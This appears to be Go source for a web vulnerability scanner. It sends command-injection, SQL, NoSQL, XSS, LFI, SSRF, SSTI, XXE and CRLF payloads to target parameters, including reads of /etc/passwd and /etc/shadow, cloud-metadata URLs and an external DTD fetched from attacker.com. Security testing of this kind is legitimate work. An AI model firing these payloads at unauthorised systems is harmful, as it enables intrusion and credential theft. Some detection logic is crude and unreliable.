package main

import (
	"fmt"
	"regexp"
	"strings"
	"net/url"
	"time"
)

var sqliPattern = regexp.MustCompile(`(?i)(sql syntax|mysql_fetch|mysql_num_rows|division by zero|ORA-01756|SQLSTATE|ODBC|Syntax error|Unclosed|Microsoft OLE DB|Warning: mysql_|You have an error in your SQL syntax|SQLite3::|PG::|PostgreSQL|Microsoft SQL|Syntax error in string in query expression|Incorrect syntax near|Unclosed quotation mark)`)
var lfiPattern = regexp.MustCompile(`(?i)(root:x:0:0:|/bin/bash|[a-z]:\\windows\\|\\[boot loader\\]|\\[operating systems\\]|\\[drivers\\]|\\[fonts\\]|\\[extensions\\]|\\[mci extensions\\]|\\[files\\]|\\[debug\\]|\\[386enh\\]|\\[network\\])`)

func scanRCEMarker(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	found := false
	marker := "pwntwomarker"
	ipBase := baseVal
	if ipBase == "" || !isLikelyIP(ipBase) {
		ipBase = "127.0.0.1"
	}
	payloads := []string{
		ipBase + ";echo " + marker,
		ipBase + "|echo " + marker,
		ipBase + "&&echo " + marker,
		ipBase + "&echo " + marker,
		ipBase + ";id",
		ipBase + "|id",
		ipBase + "&&id",
		ipBase + "&id",
	}
	for _, payload := range payloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error
		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] RCE request error: %v", reqErr)
			continue
		}
		if strings.Contains(respBody, marker) || regexp.MustCompile(`uid=\d+\(.+\)`).MatchString(respBody) {
			fmt.Printf("%s  %s COMMAND INJECTION / RCE%s\n", ColorRed, IconFinding, ColorReset)
			fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
			fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
			fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
			found = true
		}
		params.Set(param, origVal)
	}
	return found
}

func isLikelyIP(s string) bool {
	ipPattern := `^(\d{1,3}\.){3}\d{1,3}$`
	return regexp.MustCompile(ipPattern).MatchString(s)
}

func scanBooleanSQLi(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	truePayload := baseVal + "1' OR 1=1 -- "
	falsePayload := baseVal + "1' AND 1=2 -- "

	params.Set(param, truePayload)
	respTrue, _, err1 := fetchURL(cfg, baseURL+"?"+params.Encode(), "GET", nil, nil)
	params.Set(param, falsePayload)
	respFalse, _, err2 := fetchURL(cfg, baseURL+"?"+params.Encode(), "GET", nil, nil)
	params.Set(param, origVal)

	if err1 != nil || err2 != nil {
		debugPrintf(cfg, "[!] Boolean-based SQLi request error")
		return false
	}

	normalize := func(s string) string {
		return strings.ToLower(strings.Join(strings.Fields(s), ""))
	}

	if normalize(respTrue) != normalize(respFalse) {
		fmt.Printf("%s  %s BOOLEAN-BASED SQL INJECTION in '%s'%s\n", ColorRed, IconFinding, param, ColorReset)
		fmt.Printf("    %sTrue payload :%s %s%s\n", ColorYellow, ColorReset, truePayload, ColorReset)
		fmt.Printf("    %sFalse payload:%s %s%s\n", ColorYellow, ColorReset, falsePayload, ColorReset)
		return true
	}
	return false
}

func scanXSS(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) int {
	canary := genCanary()
	found := 0

	allPayloads := make([]string, 0, len(genericPayloads)+len(htmlBodyPayloads)+len(attributePayloads)+len(jsBlockPayloads)+len(eventHandlerPayloads)+len(cspBypassPayloads)+len(wafBypassPayloads))
	allPayloads = append(allPayloads, genericPayloads...)
	allPayloads = append(allPayloads, htmlBodyPayloads...)
	allPayloads = append(allPayloads, attributePayloads...)
	allPayloads = append(allPayloads, jsBlockPayloads...)
	allPayloads = append(allPayloads, eventHandlerPayloads...)
	allPayloads = append(allPayloads, cspBypassPayloads...)
	allPayloads = append(allPayloads, wafBypassPayloads...)

	for _, raw := range allPayloads {
		payload := injectCanary(raw, canary)

		params.Set(param, baseVal+payload)
		var respBody string
		var reqErr error

		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "XSS request error: %v", reqErr)
			params.Set(param, origVal)
			continue
		}

		exact, _ := isPayloadReflected(respBody, canary)
		if exact {
			contexts := findReflections(respBody, canary)
			contextLabel := "unknown"
			if len(contexts) > 0 {
				switch contexts[0] {
				case XSSContextHTMLBody:
					contextLabel = "HTML body"
				case XSSContextAttribute:
					contextLabel = "HTML attribute"
				case XSSContextJSBlock:
					contextLabel = "JavaScript block"
				case XSSContextEventHandler:
					contextLabel = "Event handler"
				}
			}

			fmt.Printf("%s  %s XSS (%s)%s\n", ColorRed, IconFinding, contextLabel, ColorReset)
			fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
			fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, raw, ColorReset)
			fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
			found++
		}

		params.Set(param, origVal)
	}
	return found
}

func scanSQLi(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) int {
	sqliPayloads := []string{
		"'", "\"", "';", "\";", "'--", "\"--", "'#", "\"#", " OR 1=1--", " OR 1=1#", " OR '1'='1'", " OR \"1\"=\"1\"",
		"' or sleep(5)--", "\" or sleep(5)--", "' OR 1=1 LIMIT 1--", "\" OR 1=1 LIMIT 1--", "admin' --",
	}
	found := 0
	for _, payload := range sqliPayloads {
		params.Set(param, baseVal+payload)
		var respBody string
		var reqErr error

		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] SQLi request error: %v", reqErr)
			continue
		}
		if sqliPattern.MatchString(respBody) {
			fmt.Printf("%s  %s SQL INJECTION%s\n", ColorRed, IconFinding, ColorReset)
			fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
			fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, baseVal+payload, ColorReset)
			fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
			found++
		}
		params.Set(param, origVal)
	}
	return found
}

func scanLFI(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) int {
	lfiPayloads := []string{
		"../../../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
		"../../../../../../../../windows/win.ini",
		"../../../../../../../../boot.ini",
		"../../../../../../../../etc/hosts",
		"../../../../../../../../etc/shadow",
		"/etc/passwd",
		"/windows/win.ini",
		"php://filter/convert.base64-encode/resource=index.php",
	}
	found := 0
	// Get baseline response for false-positive reduction
	urlWithParams := baseURL + "?" + params.Encode()
	baseRespBody, _, _ := fetchURL(cfg, urlWithParams, "GET", nil, nil)
	for _, payload := range lfiPayloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error

		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] LFI request error: %v", reqErr)
			continue
		}
		// Only report if pattern is present in payloaded response but not in baseline
		if lfiPattern.MatchString(respBody) && !lfiPattern.MatchString(baseRespBody) {
			fmt.Printf("%s  %s LFI / RFI%s\n", ColorRed, IconFinding, ColorReset)
			fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
			fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
			fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
			found++
		}
		params.Set(param, origVal)
	}
	return found
}

// Open Redirect scan: fixed version, handles headers as []string
func scanOpenRedirect(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	payload := "https://evil.com"
	params.Set(param, payload)

	urlWithParams := baseURL + "?" + params.Encode()
	respBody, headers, err := fetchURL(cfg, urlWithParams, "GET", nil, nil)
	params.Set(param, origVal) // Restore original

	if err != nil {
		debugPrintf(cfg, "[!] Open Redirect request error: %v", err)
		return false
	}

	if locs, ok := headers["Location"]; ok && len(locs) > 0 && strings.HasPrefix(locs[0], payload) {
		fmt.Printf("%s  %s OPEN REDIRECT%s\n", ColorRed, IconFinding, ColorReset)
		fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
		fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
		fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, urlWithParams, ColorReset)
		return true
	}

	if strings.Contains(respBody, payload) {
		fmt.Printf("%s  %s OPEN REDIRECT (reflected in body)%s\n", ColorRed, IconFinding, ColorReset)
		fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
		fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
		fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, urlWithParams, ColorReset)
		return true
	}

	return false
}

// Path Traversal scan function
func scanPathTraversal(cfg *ScanConfig, param, baseVal, origVal, baseURL string, params url.Values) int {
	payloads := []string{
		"../../../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
		"../../../../../../../../boot.ini",
		"../../../../../../../../etc/hosts",
		"../../../../../../../../etc/shadow",
		"/etc/passwd",
		"/windows/win.ini",
	}
	signatures := []string{"root:x:0:0:", "[extensions]", "[fonts]", "[boot loader]", "[drivers]", "[operating systems]", "[mci extensions]", "[files]", "[debug]", "[386enh]", "[network]"}
	found := 0
	for _, payload := range payloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error

		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] Path Traversal request error: %v", reqErr)
			continue
		}
		for _, sig := range signatures {
			if strings.Contains(respBody, sig) {
				fmt.Printf("%s  %s PATH TRAVERSAL%s\n", ColorRed, IconFinding, ColorReset)
				fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
				fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
				fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
				found++
				break
			}
		}
		params.Set(param, origVal)
	}
	return found
}

// CSRF scan function - Improved detection
func scanCSRF(cfg *ScanConfig, pageURL, param, baseVal, origVal, baseURL string, params url.Values) int {
	pageBody, headers, err := fetchURL(cfg, pageURL, "GET", nil, nil)
	if err != nil {
		debugPrintf(cfg, "[!] CSRF scan request error: %v", err)
		return 0
	}

	// 1. Check for CSRF token in forms with stricter matching
	csrfTokenPatterns := []string{
		`<input[^>]*name=["\']?_token["\']?`,
		`<input[^>]*name=["\']?csrf[_-]?token["\']?`,
		`<input[^>]*name=["\']?authenticity[_-]?token["\']?`,
		`<input[^>]*name=["\']?nonce["\']?`,
		`<input[^>]*name=["\']?__RequestVerificationToken["\']?`,
		`<meta[^>]*name=["\']csrf[_-]?token["\']?`,
	}

	foundToken := false
	for _, pattern := range csrfTokenPatterns {
		if regexp.MustCompile(pattern).MatchString(strings.ToLower(pageBody)) {
			foundToken = true
			break
		}
	}

	// 2. Check for SameSite/secure cookies
	setCookie := headers.Get("Set-Cookie")
	cookieSafe := strings.Contains(strings.ToLower(setCookie), "samesite") || strings.Contains(strings.ToLower(setCookie), "secure")

	// 3. Check for Content-Type validation on POST
	contentTypeHeaders := headers.Get("X-Content-Type-Options")
	contentTypeOK := strings.Contains(strings.ToLower(contentTypeHeaders), "nosniff")

	// 4. Check for double-submit cookie pattern
	doubleSubmit := strings.Contains(strings.ToLower(pageBody), "csrf") && 
		(strings.Contains(strings.ToLower(setCookie), "csrf") ||
		strings.Contains(strings.ToLower(pageBody), "X-CSRF-Token"))

	// If no protection mechanisms found, report CSRF risk
	riskLevel := 0
	if !foundToken && !cookieSafe && !contentTypeOK && !doubleSubmit {
		fmt.Printf("%s  %s CSRF RISK (Multiple unprotected forms)%s\n", ColorRed, IconFinding, ColorReset)
		fmt.Printf("    %sNo CSRF tokens, insecure cookies, or double-submit verification%s\n", ColorYellow, ColorReset)
		riskLevel = 1
	} else if !foundToken {
		fmt.Printf("%s  %s CSRF RISK (No CSRF token detected)%s\n", ColorRed, IconFinding, ColorReset)
		fmt.Printf("    %sForm lacks CSRF token protection%s\n", ColorYellow, ColorReset)
		riskLevel = 1
	}

	return riskLevel
}

// Add this function for scanning a page for file upload forms, with debug HTML print.
func scanAndParseFileUploadForms(cfg *ScanConfig, pageURL string) {
	pageBody, _, err := fetchURL(cfg, pageURL, "GET", nil, nil)
	if err != nil {
		fmt.Printf("[!] Error fetching %s: %v\n", pageURL, err)
		return
	}

	// Debug print of HTML being parsed
	if cfg.Debug {
		fmt.Println("==== PAGE HTML START ====")
		fmt.Println(pageBody)
		fmt.Println("==== PAGE HTML END ====")
	}

	forms := findFileUploadForms(pageBody)
	scanFileUploadForms(cfg, pageURL, forms)
}

// SSRF Scanner - Server-Side Request Forgery
func scanSSRF(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	ssrfPayloads := []string{
		"http://127.0.0.1:80",
		"http://localhost:80",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://0.0.0.0:22",
		"http://[::1]:80",
		"http://example.com@127.0.0.1/",
		"file:///etc/passwd",
		"gopher://127.0.0.1:25/",
	}

	for _, payload := range ssrfPayloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error
		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] SSRF request error: %v", reqErr)
			continue
		}

		// Check for signs of SSRF success
		ssrfIndicators := []string{
			"root:",
			"AWS",
			"google",
			"metadata",
			"iam",
			"secret",
			"token",
		}

		for _, indicator := range ssrfIndicators {
			if strings.Contains(strings.ToLower(respBody), strings.ToLower(indicator)) {
				fmt.Printf("%s  %s SERVER-SIDE REQUEST FORGERY (SSRF)%s\n", ColorRed, IconFinding, ColorReset)
				fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
				fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
				fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
				params.Set(param, origVal)
				return true
			}
		}
		params.Set(param, origVal)
	}
	return false
}

// SSTI Scanner - Server-Side Template Injection
func scanSSTI(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	sstiPayloads := []string{
		// Jinja2
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"#{7*7}",
		"*{7*7}",
		"{{7*'7'}}",
		"<%= 7*'7' %>",
		// ERB
		"<%= system('id') %>",
		// Freemarker
		"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
		// Velocity
		"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$rt.getRuntime().exec('id')",
	}

	baselineResp, _, _ := fetchURL(cfg, baseURL+"?"+params.Encode(), "GET", nil, nil)

	for _, payload := range sstiPayloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error
		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] SSTI request error: %v", reqErr)
			continue
		}

		// Check for template evaluation (simple payload like {{7*7}} becomes 49)
		if strings.Contains(respBody, "49") && !strings.Contains(baselineResp, "49") {
			fmt.Printf("%s  %s SERVER-SIDE TEMPLATE INJECTION (SSTI)%s\n", ColorRed, IconFinding, ColorReset)
			fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
			fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
			fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
			params.Set(param, origVal)
			return true
		}
		params.Set(param, origVal)
	}
	return false
}

// NoSQL Injection Scanner
func scanNoSQLi(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	nosqliPayloads := []string{
		"{'$ne':null}",
		"{\"$ne\":null}",
		"{'$ne':''}",
		"{\"$ne\":\"\"}",
		"{'$gt':''}",
		"{\"$gt\":\"\"}",
		"{'$exists':true}",
		"{\"$exists\":true}",
		"'; return true; //",
		"admin' || 'a'=='a",
		"1'; return true; //'",
	}

	for _, payload := range nosqliPayloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error
		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] NoSQL injection request error: %v", reqErr)
			continue
		}

		// Check for changes in response (NoSQL injection can bypass authentication)
		if strings.Contains(strings.ToLower(respBody), "success") ||
			strings.Contains(strings.ToLower(respBody), "authenticated") ||
			strings.Contains(strings.ToLower(respBody), "welcome") ||
			len(respBody) > 1000 { // Response size change indicates potential injection
			fmt.Printf("%s  %s NOSQL INJECTION%s\n", ColorRed, IconFinding, ColorReset)
			fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
			fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
			fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
			params.Set(param, origVal)
			return true
		}
		params.Set(param, origVal)
	}
	return false
}

// XXE Scanner - XML External Entity
func scanXXE(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	xxePayloads := []string{
		"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test \"test\">]><root>&test;</root>",
		"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
		"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><root/>",
	}

	for _, payload := range xxePayloads {
		params.Set(param, payload)
		var respBody string
		var reqErr error
		if strings.ToUpper(cfg.Method) == "POST" {
			respBody, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			respBody, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] XXE request error: %v", reqErr)
			continue
		}

		// Check for XXE indicators
		if strings.Contains(strings.ToLower(respBody), "root:") ||
			strings.Contains(strings.ToLower(respBody), "bin/bash") ||
			strings.Contains(strings.ToLower(respBody), "boot.ini") {
			fmt.Printf("%s  %s XML EXTERNAL ENTITY (XXE)%s\n", ColorRed, IconFinding, ColorReset)
			fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
			fmt.Printf("    %sPayload    :%s %s (truncated)%s\n", ColorYellow, ColorReset, payload[:50], ColorReset)
			fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
			params.Set(param, origVal)
			return true
		}
		params.Set(param, origVal)
	}
	return false
}

// Header Injection Scanner - CRLF Injection
func scanHeaderInjection(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	headerInjectionPayloads := []string{
		"%0d%0aX-Injected: true",
		"\r\nX-Injected: true",
		"%0aSet-Cookie: admin=true",
		"\nSet-Cookie: admin=true",
		"%0d%0aContent-Length: 0",
		"\r\nContent-Length: 0",
		"%0d%0aLocation: http://attacker.com",
		"\r\nLocation: http://attacker.com",
	}

	for _, payload := range headerInjectionPayloads {
		params.Set(param, payload)
		var respHeaders interface{}
		var reqErr error
		if strings.ToUpper(cfg.Method) == "POST" {
			_, respHeaders, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			_, respHeaders, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		if reqErr != nil {
			debugPrintf(cfg, "[!] Header Injection request error: %v", reqErr)
			continue
		}

		// Check if injected header is reflected in response
		respStr := fmt.Sprintf("%v", respHeaders)
		if strings.Contains(respStr, "X-Injected") ||
			strings.Contains(respStr, "Location:") ||
			strings.Contains(respStr, "Set-Cookie") {
			fmt.Printf("%s  %s HEADER INJECTION (CRLF)%s\n", ColorRed, IconFinding, ColorReset)
			fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
			fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
			fmt.Printf("    %sURL        :%s %s%s\n", ColorYellow, ColorReset, cfg.URL, ColorReset)
			params.Set(param, origVal)
			return true
		}
		params.Set(param, origVal)
	}
	return false
}

// Improved SQLi Scanner - Time-Based Blind Detection
func scanSQLiTimeBased(cfg *ScanConfig, param string, baseVal string, origVal string, baseURL string, params url.Values) bool {
	timeBasedPayloads := []string{
		baseVal + "' AND SLEEP(3)-- ",
		baseVal + "' AND SLEEP(5)-- -",
		baseVal + "' AND WAITFOR DELAY '00:00:03'-- ",
		baseVal + "' AND BENCHMARK(5000000,MD5('test'))-- ",
	}

	for _, payload := range timeBasedPayloads {
		params.Set(param, payload)

		start := getCurrentTime()
		var reqErr error
		if strings.ToUpper(cfg.Method) == "POST" {
			_, _, reqErr = fetchURL(cfg, baseURL, "POST", params, nil)
		} else {
			urlWithParams := baseURL + "?" + params.Encode()
			_, _, reqErr = fetchURL(cfg, urlWithParams, "GET", nil, nil)
		}
		elapsed := getElapsedTime(start)
		params.Set(param, origVal)

		if reqErr != nil {
			debugPrintf(cfg, "[!] Time-based SQLi request error: %v", reqErr)
			continue
		}

		// If response took significantly longer, it indicates time-based blind SQLi
		if elapsed > 3000 { // milliseconds
			fmt.Printf("%s  %s TIME-BASED BLIND SQL INJECTION%s\n", ColorRed, IconFinding, ColorReset)
			fmt.Printf("    %sParameter  :%s %s%s\n", ColorYellow, ColorReset, param, ColorReset)
			fmt.Printf("    %sPayload    :%s %s%s\n", ColorYellow, ColorReset, payload, ColorReset)
			fmt.Printf("    %sResponse time: %dms%s\n", ColorYellow, elapsed, ColorReset)
			return true
		}
	}
	return false
}

// Helper function to get current time
func getCurrentTime() time.Time {
	return time.Now()
}

// Helper function to get elapsed time in milliseconds
func getElapsedTime(start time.Time) int64 {
	return time.Since(start).Milliseconds()
}